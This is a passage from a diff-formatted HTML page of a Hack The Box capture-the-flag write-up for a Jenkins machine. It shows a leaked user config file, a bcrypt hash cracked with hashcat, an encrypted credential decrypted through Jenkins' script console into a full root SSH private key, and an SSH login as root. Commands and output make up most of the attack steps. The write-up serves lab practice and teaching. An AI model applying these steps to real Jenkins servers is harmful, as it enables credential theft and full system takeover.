+</span></span><span style="display:flex;"><span>      &lt;primaryViewName&gt;&lt;/primaryViewName&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;primaryViewName&gt;&lt;/primaryViewName&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;/views&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;/views&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.model.TimeZoneProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.model.TimeZoneProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;credentials@1319.v7eb_51b_3a_c97b_&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=&#34;</span>credentials@1319.v7eb_51b_3a_c97b_<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.model.PaneStatusProperties&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.model.PaneStatusProperties&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.tasks.Mailer_-UserProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.tasks.Mailer_-UserProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>        &lt;tokenList/&gt;: No such agent <span style="color:#e6db74">&#34;        &lt;tokenList/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>        &lt;/hudson.model.AllView&gt;: No such agent <span style="color:#e6db74">&#34;        &lt;/hudson.model.AllView&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;timestamp&gt;1707318554385&lt;/timestamp&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;timestamp&gt;1707318554385&lt;/timestamp&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>          &lt;owner class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.MyViewsProperty&#34;</span> reference<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../..&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;          &lt;owner class=&#34;</span>hudson.model.MyViewsProperty<span style="color:#e6db74">&#34; reference=&#34;</span>../../..<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;/properties&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;/properties&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>          &lt;properties class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.View</span>$PropertyList<span style="color:#e6db74">&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;          &lt;properties class=&#34;</span>hudson.model.View$PropertyList<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;hudson.model.TimeZoneProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.model.TimeZoneProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>        &lt;hudson.model.AllView&gt;: No such agent <span style="color:#e6db74">&#34;        &lt;hudson.model.AllView&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;providerId&gt;default&lt;/providerId&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;providerId&gt;default&lt;/providerId&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;/roles&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;/roles&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;hudson.model.PaneStatusProperties&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.model.PaneStatusProperties&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;: No such agent <span style="color:#e6db74">&#34;&lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;fullName&gt;jennifer&lt;/fullName&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;fullName&gt;jennifer&lt;/fullName&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;id&gt;jennifer&lt;/id&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;id&gt;jennifer&lt;/id&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;version&gt;10&lt;/version&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;version&gt;10&lt;/version&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;tokenStore&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;tokenStore&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;: No such agent <span style="color:#e6db74">&#34;          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-manager@215.vc1ff18d67920&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=&#34;</span>theme-manager@215.vc1ff18d67920<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;passwordHash&gt;#jbcrypt:</span>$2<span style="color:#e6db74">a</span>$10$UwR7BpEH<span style="color:#e6db74">.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;&#34;</span> exists.
+</span></span></code></pre></div><p>and we capture her password hash in <code>bcrypt</code>form: <strong><code>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></strong></p>
+<p>==&gt; We can crack it using hashcat</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> hash.txt /usr/share/wordlists/rockyou.txt.gz
+</span></span><span style="display:flex;"><span>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
+</span></span></code></pre></div><p>and we now have what seem to be valid credentials:</p>
+<ul>
+<li><strong><code>jennifer_12108429903186576833 - princess</code></strong></li>
+</ul>
+<p>==&gt; We can use them to login to the <code>Jenkins</code>instance!!</p>
+<p>Upon going to the credentials and selecting the existing one, when inspecting the HTML code we see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_.privateKey&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{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}&#34;</span>&gt;
+</span></span></code></pre></div><p>We can then try to decrypt this key using the built-in function of <code>Jenkins</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>println<span style="color:#f92672">(</span>hudson.util.Secret.decrypt<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;{AQAAABAAAAowLr...IMMaKSM=}&#34;</span><span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAt3G9oUyouXj/0CLya9Wz7Vs31bC4rdvgv7n9PCwrApm8PmGCSLgv
+</span></span><span style="display:flex;"><span>Up2m70MKGF5e+s1KZZw7gQbVHRI0U+2t/u8A5dJJsU9DVf9w54N08IjvPK/cgFEYcyRXWA
+</span></span><span style="display:flex;"><span>EYz0+41fcDjGyzO9dlNlJ/w2NRP2xFg4+vYxX+tpq6G5Fnhhd5mCwUyAu7VKw4cVS36CNx
+</span></span><span style="display:flex;"><span>vqAC/KwFA8y0/s24T1U/sTj2xTaO3wlIrdQGPhfY0wsuYIVV3gHGPyY8bZ2HDdES5vDRpo
+</span></span><span style="display:flex;"><span>Fzwi85aNunCzvSQrnzpdrelqgFJc3UPV8s4yaL9JO3+s+akLr5YvPhIWMAmTbfeT3BwgMD
+</span></span><span style="display:flex;"><span>vUzyyF8wzh9Ee1J/6WyZbJzlP/Cdux9ilD88piwR2PulQXfPj6omT059uHGB4Lbp0AxRXo
+</span></span><span style="display:flex;"><span>L0gkxGXkcXYgVYgQlTNZsK8DhuAr0zaALkFo2vDPcCC1sc+FYTO1g2SOP4shZEkxMR1To5
+</span></span><span style="display:flex;"><span>yj/fRqtKvoMxdEokIVeQesj1YGvQqGCXNIchhfRNAAAFiNdpesPXaXrDAAAAB3NzaC1yc2
+</span></span><span style="display:flex;"><span>EAAAGBALdxvaFMqLl4/9Ai8mvVs+1bN9WwuK3b4L+5/TwsKwKZvD5hgki4L1Kdpu9DChhe
+</span></span><span style="display:flex;"><span>XvrNSmWcO4EG1R0SNFPtrf7vAOXSSbFPQ1X/cOeDdPCI7zyv3IBRGHMkV1gBGM9PuNX3A4
+</span></span><span style="display:flex;"><span>xsszvXZTZSf8NjUT9sRYOPr2MV/raauhuRZ4YXeZgsFMgLu1SsOHFUt+gjcb6gAvysBQPM
+</span></span><span style="display:flex;"><span>tP7NuE9VP7E49sU2jt8JSK3UBj4X2NMLLmCFVd4Bxj8mPG2dhw3REubw0aaBc8IvOWjbpw
+</span></span><span style="display:flex;"><span>s70kK586Xa3paoBSXN1D1fLOMmi/STt/rPmpC6+WLz4SFjAJk233k9wcIDA71M8shfMM4f
+</span></span><span style="display:flex;"><span>RHtSf+lsmWyc5T/wnbsfYpQ/PKYsEdj7pUF3z4+qJk9OfbhxgeC26dAMUV6C9IJMRl5HF2
+</span></span><span style="display:flex;"><span>IFWIEJUzWbCvA4bgK9M2gC5BaNrwz3AgtbHPhWEztYNkjj+LIWRJMTEdU6Oco/30arSr6D
+</span></span><span style="display:flex;"><span>MXRKJCFXkHrI9WBr0KhglzSHIYX0TQAAAAMBAAEAAAGAD+8Qvhx3AVk5ux31+Zjf3ouQT3
+</span></span><span style="display:flex;"><span>7go7VYEb85eEsL11d8Ktz0YJWjAqWP9PNZQqGb1WQUhLvrzTrHMxW8NtgLx3uCE/ROk1ij
+</span></span><span style="display:flex;"><span>rCoaZ/mapDP4t8g8umaQ3Zt3/Lxnp8Ywc2FXzRA6B0Yf0/aZg2KykXQ5m4JVBSHJdJn+9V
+</span></span><span style="display:flex;"><span>sNZ2/Nj4KwsWmXdXTaGDn4GXFOtXSXndPhQaG7zPAYhMeOVznv8VRaV5QqXHLwsd8HZdlw
+</span></span><span style="display:flex;"><span>R1D9kuGLkzuifxDyRKh2uo0b71qn8/P9Z61UY6iydDSlV6iYzYERDMmWZLIzjDPxrSXU7x
+</span></span><span style="display:flex;"><span>6CEj83Hx3gjvDoGwL6htgbfBtLfqdGa4zjPp9L5EJ6cpXLCmA71uwz6StTUJJ179BU0kn6
+</span></span><span style="display:flex;"><span>HsMyE5cGulSqrA2haJCmoMnXqt0ze2BWWE6329Oj/8Yl1sY8vlaPSZUaM+2CNeZt+vMrV/
+</span></span><span style="display:flex;"><span>ERKwy8y7h06PMEfHJLeHyMSkqNgPAy/7s4jUZyss89eioAfUn69zEgJ/MRX69qI4ExAAAA
+</span></span><span style="display:flex;"><span>wQCQb7196/KIWFqy40+Lk03IkSWQ2ztQe6hemSNxTYvfmY5//gfAQSI5m7TJodhpsNQv6p
+</span></span><span style="display:flex;"><span>F4AxQsIH/ty42qLcagyh43Hebut+SpW3ErwtOjbahZoiQu6fubhyoK10ZZWEyRSF5oWkBd
+</span></span><span style="display:flex;"><span>hA4dVhylwS+u906JlEFIcyfzcvuLxA1Jksobw1xx/4jW9Fl+YGatoIVsLj0HndWZspI/UE
+</span></span><span style="display:flex;"><span>g5gC/d+p8HCIIw/y+DNcGjZY7+LyJS30FaEoDWtIcZIDXkcpcAAADBAMYWPakheyHr8ggD
+</span></span><span style="display:flex;"><span>Ap3S6C6It9eIeK9GiR8row8DWwF5PeArC/uDYqE7AZ18qxJjl6yKZdgSOxT4TKHyKO76lU
+</span></span><span style="display:flex;"><span>1eYkNfDcCr1AE1SEDB9X0MwLqaHz0uZsU3/30UcFVhwe8nrDUOjm/TtSiwQexQOIJGS7hm
+</span></span><span style="display:flex;"><span>kf/kItJ6MLqM//+tkgYcOniEtG3oswTQPsTvL3ANSKKbdUKlSFQwTMJfbQeKf/t9FeO4lj
+</span></span><span style="display:flex;"><span>evzavyYcyj1XKmOPMi0l0wVdopfrkOuQAAAMEA7ROUfHAI4Ngpx5Kvq7bBP8mjxCk6eraR
+</span></span><span style="display:flex;"><span>aplTGWuSRhN8TmYx22P/9QS6wK0fwsuOQSYZQ4LNBi9oS/Tm/6Cby3i/s1BB+CxK0dwf5t
+</span></span><span style="display:flex;"><span>QMFbkG/t5z/YUA958Fubc6fuHSBb3D1P8A7HGk4fsxnXd1KqRWC8HMTSDKUP1JhPe2rqVG
+</span></span><span style="display:flex;"><span>P3vbriPPT8CI7s2jf21LZ68tBL9VgHsFYw6xgyAI9k1+sW4s+pq6cMor++ICzT++CCMVmP
+</span></span><span style="display:flex;"><span>iGFOXbo3+1sSg1AAAADHJvb3RAYnVpbGRlcgECAwQFBg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>and we get the private root key!!</p>
+<p>We can then use it to log in and get the root flag::</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa root@10.129.230.220
+</span></span></code></pre></div>
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/machine/" rel="tag">Machine</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/box/" rel="tag">Box</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/jarmis/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Jarmis</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
